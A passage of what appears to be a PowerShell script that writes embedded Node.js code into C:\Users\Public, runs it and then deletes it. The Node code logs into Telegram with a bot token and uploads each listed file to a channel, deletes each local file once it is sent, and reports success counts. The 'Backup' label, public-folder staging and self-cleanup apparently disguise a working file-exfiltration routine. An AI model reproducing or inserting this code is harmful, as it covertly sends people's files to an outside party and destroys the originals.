          (async () => {
            let sd = ''; try { if (fs.existsSync('C:\\Users\\Public\\tg_session.dat')) sd = fs.readFileSync('C:\\Users\\Public\\tg_session.dat', 'utf8').trim(); } catch(_) {}
            const c = new TelegramClient(new StringSession(sd), apiId, apiHash, { connectionRetries: 5 });
            await c.start({ botAuthToken: botToken });
            let e = null;
            try { e = await c.getEntity(channelId); } catch (_) { if (/^\d+$/.test(channelId)) try { e = await c.getEntity('-100' + channelId); } catch (_) {} }
            if (!e) process.exit(1);
            let ok = 0, fa = 0;
            for (const f of m.Files) {
              if (!fs.existsSync(f.Path)) { fa++; continue; }
              let u = false;
              for (let a = 1; a <= 3 && !u; a++) {
                try {
                  await c.sendFile(e, { file: f.Path, caption: 'Backup: ' + f.Folder + '\nFile: ' + f.Name, forceDocument: true, fileName: f.Name, workers: 4 });
                  ok++; u = true; try { fs.unlinkSync(f.Path); } catch (_) {}
                } catch (err) {
                  const mg = err.errorMessage || err.message || '';
                  if (mg.includes('FLOOD_WAIT')) await new Promise(r => setTimeout(r, parseInt((mg.match(/\d+/) || ['30'])[0]) * 1000));
                  else await new Promise(r => setTimeout(r, a * 3000));
                }
              }
              if (!u) fa++;
            }
            try { await c.sendMessage(e, { message: '🏁 Final: ' + ok + ' ok, ' + fa + ' failed', parseMode: 'html' }); } catch (_) {}
            await c.disconnect();
            process.exit(fa > 0 ? 1 : 0);
          })();
          '@
          Set-Content -Path "C:\Users\Public\final_upload.js" -Value $uploadCode -Encoding UTF8 -Force
          Start-Process -FilePath "node" -ArgumentList "C:\Users\Public\final_upload.js" -WorkingDirectory "C:\Users\Public" -NoNewWindow -PassThru -Wait | Out-Null
          Remove-Item "C:\Users\Public\final_upload.js" -Force -ErrorAction SilentlyContinue
